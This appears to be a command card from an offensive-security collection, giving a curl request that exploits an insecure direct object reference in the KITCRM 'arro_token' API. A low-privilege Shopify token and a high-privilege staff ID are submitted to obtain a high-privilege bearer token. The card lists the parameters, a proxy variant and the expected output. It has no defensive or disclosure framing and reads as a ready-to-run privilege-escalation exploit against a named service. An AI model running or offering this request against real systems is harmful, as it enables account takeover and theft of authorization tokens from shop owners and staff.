---
data: >-
  curl -X POST
  "https://www.kitcrm.com/api/v1/arro_token?access_token=TOKEN&myshopify_domain=DOMAIN&id=ID"
  -H "Content-Type: application/json" -H "User-Agent: Shopify Ping/iOS/2.5.4
  (iPhone12,3/com.shopify.ping/13.1.1) - Build 3006" -d '{}'
tags:
  - idor
  - exploit
type: command
executor: bash
platforms:
  - Web
id: a82fae90-c9aa-47e7-92e9-c143cd5bce28
created_at: '2025-12-14T17:29:57.251Z'
updated_at: '2025-12-14T17:29:57.251Z'
verified: false
validated: true
submitted: true
---
# post-kitcrm-arro-token-idor

## Command

```bash
curl -X POST "https://www.kitcrm.com/api/v1/arro_token?access_token=LOW_PRIV_TOKEN&myshopify_domain=alwayzhack.myshopify.com&id=42668326968" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Shopify Ping/iOS/2.5.4 (iPhone12,3/com.shopify.ping/13.1.1) - Build 3006" \
  --data '{}'
```

## Description

Exploits IDOR by requesting a KITCRM token for a specified high-priv ID using low-priv access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| access_token | Low-priv Shopify token | Yes |
| myshopify_domain | Shop domain | Yes |
| id | High-priv staff ID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://www.kitcrm.com/api/v1/arro_token?access_token=TOKEN&myshopify_domain=DOMAIN&id=ID" -H "Content-Type: application/json" -d '{}'
```

### Advanced Usage

With custom UA and proxy:

```bash
curl -x http://burp:8080 -X POST "URL" -H "Headers" -d '{}'
```

## Expected Output

JSON: {"authorization_token": "Bearer HIGH_PRIV_TOKEN"}. 200 OK on success.

## Related

- [[Related Procedure: Exploit-IDOR-for-High-Priv-Token]]
